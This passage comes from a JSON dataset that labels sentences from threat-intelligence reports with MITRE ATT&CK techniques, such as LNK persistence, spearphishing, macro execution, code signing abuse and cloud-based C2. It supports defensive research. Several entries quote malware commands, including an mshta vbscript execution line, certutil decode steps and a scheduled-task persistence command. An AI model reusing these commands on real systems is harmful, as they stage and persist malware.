    "We have covered recent FIN7 activity in previous public blog posts:   FIN7 Spear Phishing Campaign Targets Personnel Involved in SEC Filings  FIN7 Evolution and the Phishing LNK  To SDB, Or Not To SDB: FIN7 Leveraging Shim Databases for Persistence  The FireEye iSIGHT Intelligence MySIGHT Portal contains additional information on our investigations and observations into FIN7 activity",
    "The .zip archive attached to the email contains a Windows shortcut (.lnk) file with the Microsoft Internet Explorer logo",
    "Clicking on the shortcut ultimately leads to Backdoor.Pirpi being downloaded and executed on the affected computer",
    "Comnie is able to achieve persistence via a .lnk file that is stored within the victim\u2019s startup path",
    "Additionally, in the event Kaspersky is detected, the malware will immediately run the \u2018Conime.lnk\u2019 shortcut file in a new process after it is created",
    "The script saves the decoded and decompressed executable to %APPDATA%\\Microsoft\\Windows\\Templates\\WindowsTemplate.exe and creates an LNK shortcut at %APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\OneDrive.lnk to persistently run WindowsTemplate.exe each time Windows starts up",
    "This round of FIN7 phishing lures implements hidden shortcut files (LNK files) to initiate the infection and VBScript functionality launched by mshta.exe to infect the victim",
    "In this ongoing campaign, FIN7 is targeting organizations with spear phishing emails containing either a malicious DOCX or RTF file \u2013 two versions of the same LNK file and VBScript technique",
    "This spawns the hidden embedded malicious LNK file in the document",
    "Figure 3: FIN7 phishing lure persistence mechanisms Examining Attacker Shortcut Files In many cases, attacker-created LNK files can reveal valuable information about the attacker\u2019s development environment",
    "These files can be parsed with lnk-parser to extract all contents",
    "LNK files have been valuable during Mandiant incident response investigations as they include volume serial number, NetBIOS name, and MAC address",
    "If this file exists, the content is read in order to obtain a path to find a second file with the LNK (link) extension",
    "The LNK file is finally used to identify a third file: a ZIP file",
    "When it is executed, it creates two files: an LNK file that points to %system32%\\rundll32.exe, and the FELIXROOT loader component",
    "The LNK file is moved to the startup directory",
    "This file is then copied to a filename of \u2018Windows Update.lnk\u2019, which is placed in the startup path previously identified",
    "This shortcut file points to the path of the previously written \u2018Applet.cpl\u2019 file",
    "Finally, Reaver.v1 will execute the \u2018~WUpdate.lnk\u2019 file in a new process, thus loading the recently dropped malicious CPL file",
    "This shortcut file points to the path of the previously written \u2018winhelp.cpl\u2019 file",
    "Finally, Reaver.v2 will execute the \u2018~Update.lnk\u2019 file in a new process, thus loading the recently dropped malicious CPL file",
    "This shortcut file calls the built-in \u2018control.exe\u2019 utility to in turn load the previously dropped malicious CPL file of \u2018winhelp.cpl\u2019",
    "In this campaign the KopiLuwak backdoor was encoded and delivered in a Windows shortcut (.lnk) file",
    "The lnk files were an especially interesting development because the powershell code they contain for decoding and dropping the payload is nearly identical to that utilized by the Zebrocy threat actor a month earlier",
    "Using Windows Shortcut files (.lnk) in the Startup folder that invoke the Windows Scripting Host (wscript.exe) to execute a Jscript backdoor for persistence",
    "When the Trojan runs as an executable within the \u201cDsvHelper\u201d folder, the Trojan will create a shortcut (.lnk file) and save the shortcut to the \u2018DsvHelper\u2019 folder",
    "2 Successful payload download Astaroth\u2019s initial payload is a malicious .lnk file, a common delivery method used by threat actors",
    "Malicious .lnk files contain a link to a URL (instead of the expected local URI) to grab the next payload",
    "In the case of Astaroth trojan, the .lnk file contains an argument into WMIC.exe to run in non-interactive mode, which forgoes opening a window that the victim could notice, to download the hardcoded url in the .lnk",
    "Adversaries may create or modify shortcuts that can execute a program during system boot or user login. Shortcuts or symbolic links are used to reference other files or programs that will be opened or executed when the shortcut is clicked or executed by a system startup process.\n\nAdversaries may abuse shortcuts in the startup folder to execute their tools and achieve persistence.(Citation: Shortcut for Persistence ) Although often used as payloads in an infection chain (e.g. [Spearphishing Attachment](https://attack.mitre.org/techniques/T1566/001)), adversaries may also create a new shortcut as a means of indirection, while also abusing [Masquerading](https://attack.mitre.org/techniques/T1036) to make the malicious shortcut appear as a legitimate program. Adversaries can also edit the target path or entirely replace an existing shortcut so their malware will be executed instead of the intended legitimate program.\n\nShortcuts can also be abused to establish persistence by implementing other methods. For example, LNK browser extensions may be modified (e.g. [Browser Extensions](https://attack.mitre.org/techniques/T1176)) to persistently launch malware."
  ],
  "new service remote services-multi": {
    "technique_names": ["create or modify system process", "remote services"],
    "sentances": [
      "Service providers have significant access to customer networks, enabling an attacker who had compromised a service provider to move laterally into the network of the service provider\u2019s customer"
    ]
  },
  "new service system network configuration discovery connection proxy-multi": {
    "technique_names": [
      "create or modify system process",
      "system network configuration discovery",
      "proxy"
    ],
    "sentances": [
      "Once connectivity to the service provider IP was verified, the actor established the service provider IP as a proxy for the victim\u2019s SOGU backdoor"
    ]
  },
  "data encoding": [
    "The tactic also serves to mask malicious C2 and exfiltration traffic and make it appear innocuous",
    "Encoded Payload   Decoded Payload     MD5   Size   Import Hash   Exported Function   Version    aa3f303c3319b14b4829fe2faa5999c1  322164  182ee99b4f0803628c30411b1faa9992  l7MF25T96n45qOGWX  5.3.2    126067d634d94c45084cbe1d9873d895  330804  5f45532f947501cf024d84c36e3a19a1  hJvTJcdAU3mNkuvGGq7L  5.4.1    fce54b4886cac5c61eda1e7605483ca3  345812  c1942a0ca397b627019dace26eca78d8  WcuH  5.4.1    Table 2: Static characteristics of UPPERCUT Another new feature in the latest UPPERCUT sample is that the malware sends an error code in the Cookie header if it fails to receive the HTTP response from the command and control (C2) server",
    "Another difference in the network traffic generated from the malware is that the encoded proxy information has been added in the URL query values during the C2 communication",
    "The communication and exfiltration of data was detected in a real-world scenario using the Cybereason platform",
    "The encoded payload is then made to look like a URI by having a random number of \u2018/\u2019 characters inserted at random locations within the encoded payload",
    "McAfee ATR has now discovered additional implants that are part of an operation to gain persistence for continued data exfiltration and for targeted access",
    "The optional HTTP data with king.jpg looks like a beacon to inform the control server that the malware is ready to accept new commands:  Commands received from the control server are encoded DWORDs After decoding, these DWORDs should be in the range 123459h to 123490h  Malware checking to make sure a received command is in the correct range",
    "If the size is 7 bytes or more, the backdoor verifies that the command and control server sent an encoded package",
    "The generated buffer is encoded using the BASE64 alphabet to be sent in the POST request",
    "The DropIt Trojan we analyzed is an executable that builds an embedded executable by decoding embedded blobs of base64 encoded data and concatenating them together in the correct order",
    "It then sends the following IRC commands: NICK bxphzrjbxp USER bxphzrjbxp bxphzrjbxp bxphzrjbxp bxphzrjbxp To make sure it connected to the correct server, the Trojan checks for the message sent from the IRC server after the bot connects: Welcome to the MpkNet IRC Network The MPK bot does not join a specific IRC channel, instead sending private messages (PRIVMSG) to a user with the nick \u201cmpk\u201d",
    "In response to this request, the C2 server responds with a Base64-encoded RSA public key (seen in Figure 12)",
    "Data that is sent is compressed and then base64-encoded before being included in the requests",
    "The C2 server sends back Base64 encoded response",
    "The script gathers system specific data, such as the domain the system belongs to and the current username, that it constructs in the following format: \u00a0 <domain>\\<username>:pass \u00a0 The above string is encoded using a custom base64 encoder to strip out non-alphanumeric characters (=, / and +) from the data and replaces them with domain safe values (01, 02 and 03 respectively)",
    "A notable characteristic of CopyKittens is the use of DNS for command and control communication (C&C) and for data exfiltration",
    "Note: CTU researchers frequently observe threat actors renaming archiving tools and storing data for exfiltration in uncommon directories",
    "This encoded information then gets an additional header added and sent across the network.",
    "Once the host-based enumeration information was obtained, it was base64-encoded and then appended to the URL post request to a C2, whereas in previous versions this information was written to a text file.",
    "Adversaries may encode data to make the content of command and control traffic more difficult to detect. Command and control (C2) information can be encoded using a standard data encoding system. Use of data encoding may adhere to existing protocol specifications and includes use of ASCII, Unicode, Base64, MIME, or other binary-to-text and character encoding systems.(Citation: Wikipedia Binary-to-text Encoding) (Citation: Wikipedia Character Encoding) Some data encoding systems may also result in data compression, such as gzip."
  ],
  "spearphishing link spearphishing attachment-multi": {
    "technique_names": [
      "phishing: spearphishing link",
      "phishing: spearphishing attachment"
    ],
    "sentances": [
      "In this campaign, the group sent spear phishing emails containing malicious documents that led to the installation of the UPPERCUT backdoor"
    ]
  },
  "phishing: spearphishing attachment": [
    "Attack Overview The attack starts with Microsoft Word documents containing a malicious VBA macro being attached to spear phishing emails",
    "The actor has used several notable techniques in these incidents such as sniffing passwords from Wi-Fi traffic, poisoning the NetBIOS Name Service, and spreading laterally via the EternalBlue exploit.\u00a0 APT28 Uses Malicious Document to Target Hospitality Industry FireEye has uncovered a malicious document sent in spear phishing emails to multiple companies in the hospitality industry, including hotels in at least seven European countries and one Middle Eastern country in early July",
    "Initial Compromise For initial compromise, FireEye Intelligence has observed APT39 leverage spear phishing emails with malicious attachments and/or hyperlinks typically resulting in a POWBAT infection",
    "Malware Delivery Method  In all emails sent to these government officials, the actor used the same attachment: a malicious Microsoft Word document that exploited the CVE-2012-0158 vulnerability to drop a malicious payload",
    "Figure 1: Contents of the Email A review of the email header data from the spear phishing messages showed that the threat actors sent the emails using the same infrastructure they have used in the past",
    "In at least some of these recent attacks, Buckeye used spear-phishing emails with a malicious .zip attachment",
    "Looking at earlier attacks between 2013 and 2016, we believe Comnie was also used in targeted attacks against the following individuals or organizations:  Taiwan government IT service vendor in Asia Journalist of a Tibetan radio station   Figure 6 Email sent to Journalist of Tibetan radio station \u00a0 Malicious Macros The malicious macro documents used to deliver Comnie initially hide the content inside and requests that the user enables macros prior to viewing the document",
    "APT32 actors continue to deliver the malicious attachments via spear-phishing emails",
    "The credential harvesting attacks used spear-phishing emails that contained malicious Microsoft Office documents that leveraged the \u201cattachedTemplate\u201d technique to load a template from a remote server",
    "The attack involved a spear-phishing email with a subject of \u201cProject Offer\u201d and a malicious Word document (SHA256: d393349a4ad00902e3d415b622cf27987a0170a786ca3a1f991a521bff645318) as an attachment",
    "Attached to this email was a malicious Microsoft Word document (MD5: f6fafb7c30b1114befc93f39d0698560) that exploited CVE-2012-0158",
    "Like past attacks, the initial infection vector is a malicious Word document attached to a phishing email that is well-tailored to the targeted business and its day-to-day operations",
    "Phishing emails with political themes were used in the majority of the observed attack emails",
    "In order to meet the phishing emails\u2019 infrastructure requirements, disposable domains and emails were used as the delivery medium",
    "Based on our analysis, financial organizations in Turkey were targeted via spear phishing emails containing a malicious Microsoft Word document",
    "Figure 2: Excerpt of an APT33 malicious .hta file We assess APT33 used a built-in phishing module within the publicly available ALFA TEaM Shell (aka ALFASHELL) to send hundreds of spear phishing emails to targeted individuals in 2016",
    "The spear phishing emails and attached malicious macro documents typically have geopolitical themes",
    "The attackers used spear phishing emails combined with malicious HWP documents created using Hancom Hangul Office Suite",
    "We suspect the attacker was trying to generate sympathy by reminding the reader that Munchon and the province it is in, Kangwon, were part of a unified province that included South Korea's Gangwon-do prior to the division of Korea in 1945.A second email contained a story about a person called 'Ewing Kim' who was looking for help:The email's attachments are two different HWP documents, both leveraging same vulnerability (CVE-2013-0808)",
    "This campaign began with a handful of spear phishing emails to South Korean targets and containing malicious attachments",
    "MAGIC HOUND TOOLSET The Magic Hound attacks did not rely on exploit code to compromise targeted systems, instead relying on executables and Microsoft Office documents, specifically Excel and Word documents containing malicious macros",
    "The emails had a malicious Excel macro document attached, which when executed led to a new Microsoft Visual Basic (VB) script-based malware family which we are dubbing \u201cBabyShark\u201d",
    "Another interesting characteristic of the malicious documents is that the metadata associated with the document files themselves also matches that found in many of the malicious documents that were previously being used to spread Remcos.Figure 3: Document metadataAdditionally, the creation and modification dates associated with these documents are shortly after we released a detailed analysis of Remcos distribution campaigns that were being observed throughout 2018",
    "In May 2016, we\u00a0published\u00a0a blog detailing a spear phishing campaign targeting banks in the Middle East region that used macro-enabled attachments to distribute POWBAT malware",
    "Analysis APT34 sent a malicious .rtf file (MD5: a0e6933f4e0497269620f44a083b2ed4) as an attachment in a malicious spear phishing email sent to the victim organization",
    "This attack diverged from previous attacks we observed from this group as it involved spear-phishing emails sent to targeted organizations with password protected RAR archive attachments that contained malicious Excel Web Query files (.iqy)",
    "In this instance a spear phishing email was used containing a lure designed to socially engineer and entice the victim to executing a malicious attachment",
    "In contrast to the two samples used in these attacks, this one did not use a PE attachment, and instead used a Microsoft Word document containing a malicious macro as the delivery vehicle",
    "The email contained an attachment named Seminar-Invitation.doc, which is a malicious Microsoft Word document we track as ThreeDollars",
    "Zebrocy is delivered primarily via phishing attacks that contain malicious Microsoft Office documents with macros as well as simple executable file attachments",
    "Malicious Document   Decoy Document  The attack starts with a spear-phishing email containing the HWP document named \"\ubbf8\ubd81 \uc815\uc0c1\ud68c\ub2f4 \uc804\ub9dd \ubc0f \ub300\ube44.hwp\" (Prospects for US-North Korea Summit .hwp)",
    "Initial Attack On December 13, 2017, a spear phishing email was sent from the email address of yuri.sidorav@yandex[.]ru to a high ranking individual within a British government agency",
    "Traps blocks all of the files currently associated with Gorgon Group  \u00a0 Appendix \u00a0 Analysis of a targeted attack \u201c1971 Liberation War Freedom Fighters in Pakistan ArmyCustody Database98\u201d The delivery documents used in the targeted attacks are Microsoft Office documents that contain a macro that attempts to compromise the system",
    "Delivery TG-3390 conducts SWCs or sends spearphishing emails with ZIP archive attachments",
    "The initial infection vector of this campaign is a Microsoft Office Excel Worksheet with an Office macro that uses the mshta.exe Windows executable to run scripts, which are embedded in the HTML of a specially-crafted blogspot.com page",
    "",
    "The case we found arrived through a targeted email that contained a document file (in docx format).",
    "APT32 likely used COVID-19-themed malicious attachments against Chinese speaking targets.",
    "Adversaries may send spearphishing emails with a malicious attachment in an attempt to gain access to victim systems. Spearphishing attachment is a specific variant of spearphishing. Spearphishing attachment is different from other forms of spearphishing in that it employs the use of malware attached to an email. All forms of spearphishing are electronically delivered social engineering targeted at a specific individual, company, or industry. In this scenario, adversaries attach a file to the spearphishing email and usually rely upon [User Execution](https://attack.mitre.org/techniques/T1204) to gain execution. Spearphishing may also involve social engineering techniques, such as posing as a trusted source.\n\nThere are many options for the attachment such as Microsoft Office documents, executables, PDFs, or archived files. Upon opening the attachment (and potentially clicking past protections), the adversary's payload exploits a vulnerability or directly executes on the user's system. The text of the spearphishing email usually tries to give a plausible reason why the file should be opened, and may explain how to bypass system protections in order to do so. The email may also contain instructions on how to decrypt an attachment, such as a zip file password, in order to evade email boundary defenses. Adversaries frequently manipulate file extensions and icons in order to make attached executables appear to be document files, or files exploiting one application appear to be a file for a different one. "
  ],
  "user execution": [
    "Once the password (delivered in the body of the email) is entered, the users are presented with a document that will request users to enable the malicious macro, as shown in Figure 3",
    "Successful execution of the macro within the malicious document results in the installation of APT28\u2019s signature GAMEFISH malware",
    "Once the user enables macros, the macro will perform the following actions:  Displays decoy content Checks for the existence of a file at %APPDATA%\\wscript.exe If %APPDATA%\\wscript.exe does not exist, the macro converts an embedded hex-encoded string into bytes and saves this data to the %APPDATA%\\wscript.exe",
    "None of the known documents contain a lure image or message to instruct the recipient to click the Enable Content button necessary to run the macro, as seen in Figure 1",
    "The majority of delivery documents contain a generic lure image requesting the victim enable macros with no additional content, the adversaries seemingly relying solely on lure filenames to entice victims to launch the malicious document",
    "The victim will then see a prompt to Enable Content as with any malicious macro document as seen in Figure 5",
    "Figure 5 Remote template document requesting the user to click \u201cEnable Content\u201d to run macro Clustering The delivery documents used in the October and November waves shared a large number of similarities, as seen in Table 1, which allowed us to cluster the activity together",
    "Figure 1: Malicious FIN7 lure asking victim to double click to unlock contents The malicious LNK launches \u201cmshta.exe\u201d with the following arguments passed to it: vbscript:Execute(\"On Error Resume Next:set w=GetObject(,\"\"Word.Application\"\"):execute w.ActiveDocument.Shapes(2).TextFrame.TextRange.Text:close\") The script in the argument combines all the textbox contents in the document and executes them, as seen in Figure 2",
    "Malicious processes are marked red (click image to enlarge):  The following malicious files are dropped and run:  C:\\ProgramData\\{2ED05C38-D464-4188-BC7F-F6915DE8D764}\\OFFLINE\\9A189DFE\\C7B7C186\\main.vbs dcac79d7dc4365c6d742a49244e81fd0 C:\\Users\\Public\\Libraries\\RecordedTV\\DnE.ps1 7fe0cb5edc11861bc4313a6b04aeedb2 C:\\Users\\Public\\Libraries\\RecordedTV\\DnS.ps1 3920c11797ed7d489ca2a40201c66dd4 \u201cC:\\Windows\\System32\\schtasks.exe\u201d /create /F /sc minute /mo 3 /tn \u201cGoogleUpdateTasksMachineUI\u201d /tr C:\\Users\\Public\\Libraries\\RecordedTV\\backup.vbs 7528c387f853d96420cf7e20f2ad1d32  Command and control server is located in the following domain: tecsupport[.]in A detailed analysis of the malware is provided in two\u00a0posts by Palo Alto networks and in a post\u00a0by FireEye, which\u00a0wrote about previous campaigns by this threat agent",
    "This document was a decoy aimed to entice the user to open malicious documents embedded further down the pageThe actor embedded two additional links and the document urged the user to click on these links for more information about New Year's activities in North Korea",
    "These documents contained malicious OLE objects used to drop binaries.This time, however, they contained malicious OLE (Object Link Embedded) objects.Initial analysis confirmed two similarly sized OLE object files within this document which appeared to be the same from an execution point of view.The two dropped binaries were stored and executed in this location during our analysis:C:\\Users\\ADMINI~1\\AppData\\Local\\Temp\\Hwp (2).exeC:\\Users\\ADMINI~1\\AppData\\Local\\Temp\\Hwp (3).exeInitial analysis showed some sloppy cleaning up from Group123, which we used later to determine that separate campaigns were the work of this same actor, as compilation artifacts remained within the binaries:e:\\Happy\\Work\\Source\\version 12\\T+M\\Result\\DocPrint.pdbThe second stage of the dropped binaries was used to execute wscript.exe while injecting shellcode into this process",
    "Email attacks often use \u201cclick-worthy\u201d or interesting topics to convince users to click links or open attachments that could lead to various threats",
    "Users are advised to avoid opening attachments and click links on unsolicited emails",
    "In one example, the Word document contained a button with the label \u201cFirst click \u201cEnable Content\u201d above the page, then click here to fill out the form\u201d  This string attempts to trick the user into enabling macros to execute the malicious code within the macro",
    "These Honeybee documents did not contain any specific lures, rather variations of a \u201cnot compatible\u201d message attempting to convince the user to enable content",
    "Additionally, a small number of campaigns over this same period also made use of various file-sharing platforms like Dropbox for hosting the malicious documents rather than directly attaching them to the messages themselves.Figure 2: Example malicious Excel documentSimilar to the technique described in our previous blog about Remcos, the contents of the documents have been intentionally made to appear as if they are blurry, with the user being prompted to enable editing to have a clearer view of the contents",
    "By default, Excel does not allow the download of data from the remote server, but will ask for the user\u2019s consent by presenting the dialog box in Figure 2:  Figure 2 Excel security notice for .iqy files By enabling this data connection, the user allows Excel to obtain content from the URL in the .iqy file",
    "The document also contained a lure image, similar to ones commonly found in malicious macro documents which ask the user to click on \u201cEnable Content\u201d as seen in Figure 2",
    "Malicious Macro Analysis When the victim opens the ThreeDollars document they are presented with the lure image and prompted to click on the \u201cEnable Content\u201d button",
    "Message 3:    Headers Received: by mailcenter.support   Sender Mercator Institute for China Studies <publications@mericcs.org>   Subject Authoritarian advance Responding to Chinas growing political influence in Europe   Body Content and images included within the e-mail body were a direct copy of the following MERICS report:  https://www.merics.org/sites/default/files/2018-02/GPPi_MERICS_Authoritarian_Advance_2018_1.pdf   Notes The hyperlinked text Click here to download the report within the e-mail body lead to a malicious RTF document located at the URL hxxp://www.mericcs.org/GPPi_MERICS_Authoritarian_Advance_2018_1Q.doc",
    "Cluster A Case 1: Delivery via document property macro \u2013 a789a282e0d65a050cccae66c56632245af1c8a589ace2ca5ca79572289fd483 \u00a0In our research we found at least one attack against a company leveraging a Microsoft Office Excel document with an embedded macro to launch the malware",
    "By doing so, the main content of the macro itself (Figure 2) can be kept relatively simple, and the malicious\u2019 codes small footprint can help enable evasion of automated detection mechanisms based on macro content",
    "",
    "In March, we came across an email with a malware attachment that used the Gamaredon group\u2019s tactics.",
    "",
    "Whitefly first infects its victims using a dropper in the form of a malicious .exe or .dll file that is disguised as a document or image.",
    "",
    "Once a user has double-clicked the embedded image, the form executes a VB setup script",
    "The threat actors also took additional steps to replace some variable strings in the more recent samples, likely in an attempt to avoid signature-based detection from Yara rules. Once the document was opened, it prompted the user to enable the macro titled \"BlackWater.bas\".",
    "An adversary may rely upon specific actions by a user in order to gain execution. Users may be subjected to social engineering to get them to execute malicious code by, for example, opening a malicious document file or link. These user actions will typically be observed as follow-on behavior from forms of [Phishing](https://attack.mitre.org/techniques/T1566).\n\nWhile [User Execution](https://attack.mitre.org/techniques/T1204) frequently occurs shortly after Initial Access it may occur at other phases of an intrusion, such as when an adversary places a file in a shared directory or on a user's desktop hoping that a user will click on it. This activity may also be seen shortly after [Internal Spearphishing](https://attack.mitre.org/techniques/T1534).\n\nAdversaries may also deceive users into performing actions such as enabling [Remote Access Software](https://attack.mitre.org/techniques/T1219), allowing direct control of the system to the adversary, or downloading and executing malware for [User Execution](https://attack.mitre.org/techniques/T1204). For example, tech support scams can be facilitated through [Phishing](https://attack.mitre.org/techniques/T1566), vishing, or various forms of user interaction. Adversaries can use a combination of these methods, such as spoofing and promoting toll-free numbers or call centers that are used to direct victims to malicious websites, to deliver and execute payloads containing malware or [Remote Access Software](https://attack.mitre.org/techniques/T1219).(Citation: Telephone Attack Delivery)"
  ],
  "process hollowing execution through api masquerading application window discovery-multi": {
    "technique_names": [
      "process injection: process hollowing",
      "native api",
      "masquerading",
      "application window discovery"
    ],
    "sentances": [
      "2.\u00a0\u00a0\u00a0\u00a0 The macro decodes the dropped files using Windows certutil.exe with the following commands (certutil.exe is a legitimate built-in command-line program to manage certificates in Windows):    C:\\Windows\\System32\\cmd.exe\" /c certutil -decode C:\\ProgramData\\padre1.txt C:\\ProgramData\\\\GUP.txt    C:\\Windows\\System32\\cmd.exe\" /c certutil -decode C:\\ProgramData\\padre2.txt C:\\ProgramData\\\\libcurl.txt    C:\\Windows\\System32\\cmd.exe\" /c certutil -decode C:\\ProgramData\\padre3.txt C:\\ProgramData\\\\3F2E3AB9    3.\u00a0\u00a0\u00a0\u00a0 The macro creates a copy of the files with their proper extensions using Extensible Storage Engine Utilities (esentutil.exe) with the following commands (esentutil.exe is also a legitimate program that is pre-installed in Windows):    C:\\Windows\\System32\\esentutl.exe\" /y C:\\ProgramData\\\\GUP.txt /d C:\\ProgramData\\GUP.exe /o    C:\\Windows\\System32\\esentutl.exe\" /y C:\\ProgramData\\\\libcurl.txt /d C:\\ProgramData\\libcurl.dll /o   The dropped files include the following:  GUP.exe\u00a0:\u00a0GUP, a free (LGPL) Generic Updater.\u00a0GUP is an open source binary used by Notepad++ for software updates"
    ]
  },
  "subvert trust controls: code signing": [
    "The version used here is version 4.1 digitally signed by Notepad++, as shown in Figure 5",
    "By using this technique, the malware is able to leverage itself from a signed and verified legitimate Windows OS process, or, alternatively, if aswrundll.exe or unins000.exe exists, a signed and verified security product process",
    "FIN7 has consistently utilized legally purchased code signing certificates to sign their CARBANAK payloads",
    "In these websites they hosted malware that was digitally signed\u00a0with a valid, likely stolen code signing certificate Based on VirusTotal uploads, malicious documents content, and known victims \u2013 other targeted organisations are located in Turkey, Qatar, Kuwait, United Arab Emirates, Saudi Arabia, and Lebanon",
    "Digitally signed malware The entire bundle (VPN client and malware) was digitally signed with a valid code signing certificate issued by Symantec to AI Squared, a legitimate software company that develops accessibility software:  Thumbprint: F340C0D841F9D99DBC289151C13391000366631C Serial number: 45 E4 7F 56 0B 01 B6 4E 68 39 5E 5D 79 2F 2E 09 Another Helminth sample,\u00a01c23b3f11f933d98febfd5a92eb5c715, was signed with a different AI Squared code signing certificate: Thumbprint: 92B8C0872BACDC226B9CE4D783D5CCAD61C6158A Serial number:62 E0 44 E7 37 24 61 2D 79 4B 93 AF 97 46 13 48 This suggest that the attackers had got a hold of an Ai Squared signing key, potentially after compromising their network",
    "The file, named Microsoft.Win32.TaskScheduler.dll, is digitally signed by a certificate from AirVPN",
    "The DLL is also digitally signed by a certificate from \u201cAirVPN\u201d",
    "They combine reconnaissance of GPO (Group Policy Object management for execution) with digitally-signed malware to avoid detection or blocking during their infection phases",
    "Stolen code signing certificates used to sign malware",
    "Many of this APT\u2019s components are signed with phony Intel and AMD digital certificates",
    "Adversaries may create, acquire, or steal code signing materials to sign their malware or tools. Code signing provides a level of authenticity on a binary from the developer and a guarantee that the binary has not been tampered with. (Citation: Wikipedia Code Signing) The certificates used during an operation may be created, acquired, or stolen by the adversary. (Citation: Securelist Digital Certificates) (Citation: Symantec Digital Certificates) Unlike [Invalid Code Signature](https://attack.mitre.org/techniques/T1036/001), this activity will result in a valid signature.\n\nCode signing to verify software on first run can be used on modern Windows and macOS systems. It is not used on Linux due to the decentralized nature of the platform. (Citation: Wikipedia Code Signing)(Citation: EclecticLightChecksonEXECodeSigning)\n\nCode signing certificates may be used to bypass security policies that require signed code to execute on a system. "
  ],
  "screen capture standard application layer protocol exfiltration over command and control channel data encoding remote file copy-multi": {
    "technique_names": [
      "screen capture",
      "application layer protocol",
      "exfiltration over c2 channel",
      "data encoding",
      "ingress tool transfer"
    ],
    "sentances": [
      "Commands   Description    0x97A168D9697D40DD  Download and validate file (XXHash comparison) from C2 server    0x7CF812296CCC68D5  Upload file to C2 server    0x652CB1CEFF1C0A00  Load PE file    0x27595F1F74B55278  Download, validate (XXHash comparison), execute file, and send output to C2 server    0xD290626C85FB1CE3  Format the current timestamp    0x409C7A89CFF0A727  Capture the desktop screenshot in PNG format and send it to C2    None of the above  The received buffer is executed via cmd.exe and the output is then sent to the C2 server    Table 5: Supported commands  Conclusion While APT10 consistently targets the same geolocation and industry, the malware they use is actively evolving"
    ]
  },
  "web service": [
    "These appeared to be hosted on either Linode or Google Cloud, with a preference for using the ASN AS63949",
    "Command and Control Infrastructure: Compromised servers, messaging platforms, and cloud service providers to avoid detection",
    "In addition, multiple APT40 command and control (C2) domains were initially registered by China based domain resellers and had Whois records with Chinese location information, suggesting a China based infrastructure procurement process",
    "Some APT40 malware tools can evade typical network detectiona by leveraging legitimate websites, such as GitHub, Google, and Pastebin for initial C2 communications",
    "This RAT communicates with 5.189.145.248, a command and control (C2) IP address that this group has used previously with other malware, including DarkComet and NJRAT",
    "BRONZE UNION appears to use a combination of self-registered IP addresses and commercial VPN services in its command and control (C2) and operational infrastructure",
    "LOWBALL abuses the Dropbox cloud storage service for command and control (CnC)",
    "The attack is part of a trend where threat groups hide malicious activity by communicating with legitimate web services such as social networking and cloud storage sites to foil detection efforts.[2][3] A Cyber Campaign Likely Intended to Monitor Hong Kong Media During a Period of Crisis The threat group has previously used newsworthy events as lures to deliver malware.[4] They have largely targeted organizations involved in financial, economic and trade policy, typically using publicly available RATs such as Poison Ivy, as well some non-public backdoors.[5] The group started targeting Hong Kong media companies, probably in response to political and economic challenges in Hong Kong and China",
    "Firstly, the Trojan will use the following regular expression to determine if the C2 server wishes to cancel the C2 communications:       216.58.192.174|2a00:1450:4001:81a::200e|2200::|download.microsoft.com|ntservicepack.microsoft.com|windowsupdate.microsoft.com|update.microsoft.com     Additionally, the RogueRobin Trojan uses the regular expressions in Table 3 to confirm that the DNS response contains the appropriate data for it to extract information from",
    "The string is formatted as \u201c<domain list>|<minimum query size>|<maximum query size>|<hasGarbage>|<sleepPerRequest>|<maximum requests>|<query types>|<hibridMode>|<current query mode>\u201d   ^slp Sets the sleep and jitter values   ^exit Exits the Trojan    Table 5 Commands available within the C# variant of RogueRobin Using Google Drive for C2 A command that was not available in the original PowerShell variant of RogueRobin but is available with the new C# variant is the x_mode",
    "This command is particularly interesting as it enables an alternative command and control channel that uses the Google Drive API",
    "To use Google Drive, the x_mode command received from the C2 server via DNS tunneling will be followed by a newline-delimited list of settings needed to interact with the Google Drive account",
    "Figure 4 x_mode command and new line delimited settings As seen in Figure 4, the settings are stored in variables seen in Table 6, which are used to authenticate to the actor-controlled Google account before uploading and downloading files from Google Drive",
    "Variable Name Description   gdu Google Drive URL for downloading files to the Google Drive account   gduu Google Drive URL for uploading files to the Google Drive account   gdue Google Drive URL for updating a file on the Google Drive account   gdo2t Google Drive URL used to get the OAUTH access_token   client_id The client_id for the OAUTH application   cs The client_secret for OAUTH   r_t The refresh_token for OAUTH    Table 6 Variables used to store settings needed to use Google Drive as a C2 To obtain an OAUTH access token to authenticate to the actor provided Google account, the Trojan sends an HTTP POST request to a URL stored in the gdo2t variable with grant_type, client_id, client_secret, and refresh_token fields added to the HTTP header and in the POST data",
    "Figure 6 Hardcoded Google Drive URL used in RogueRobin sample When the modification_time for the first file changes, the Trojan downloads the contents from the first file uploaded to the Google Drive",
    "To get a job from the Google Drive account, the Trojan starts by creating a string that has the following structure with each element within the subdomain subjected to the number to character substitution from Table 4: c<unique identifier><job identifier padded with \u20180\u2019 to make three digits><sequence number>c.<C2 domain> The Trojan will then obtain an OAUTH access token to the Google Drive in the same manner as before when obtaining the unique identifier",
    "Lastly, the new variant of RogueRobin is capable of using the Google Drive cloud service for its C2 channel, suggesting that DarkHydrus may be shifting to abusing legitimate cloud services for their infrastructure",
    "The Delphi variant of Cannon does not use legitimate web-based email services for its C2 communications, instead opting to use email accounts at an actor owned domain, ambcomission[.]com",
    "Then pastebin.com, github.com, mailimg.com, upload.cat, dev-point.com and pomf.cat were used as channels for the different malware stages before achieving a full RAT implementation, which then communicates with the corresponding C2 server",
    "However, the attacks different stages were hosted on a variety of free sites such as Mailimg, Github, Pastebin, dev-point.co, a.pomf.cat, and upload.cat",
    "The command index table and command handler address table.\u00a0 Implant Capabilities Based on the responses received from the control server, the malware can carry out the following malicious tasks:  Recursively generate a list of files in a directory and send to the control server Terminate a specific process",
    "The actor has the following demonstrated capabilities:To include exploits (for Hangul and Microsoft Office) in its workflows.To modify its campaigns by splitting the payload in to multiple stages To use compromised web servers or legitimate cloud based platforms",
    "Here is a list of the platforms used by this variant: Twitter, Yandex and Mediafire",
    "The majority of documents used the name \u201cgerry knight\u201d for the author field in the document metadata, and the embedded macros largely used direct IP connections to command and control (C2) servers rather than using domain names",
    "It has historically leveraged legitimate third-party websites to host the malware\u2019s command and control (C2) information, acting as \u201cdead drops\u201d",
    "This tactic uses public web services to host content that contains encoded commands that are decoded by the malware",
    "This can be seen in the following images taken from hxxp:// feeds.rapidfeeds[.]com/88604/, which is one of the dead drop resolvers we encountered in this sample:  Figure 7 Dead drop resolver used by BADNEWS \u00a0 In order to decrypt this data, the authors have included additional steps from previous versions",
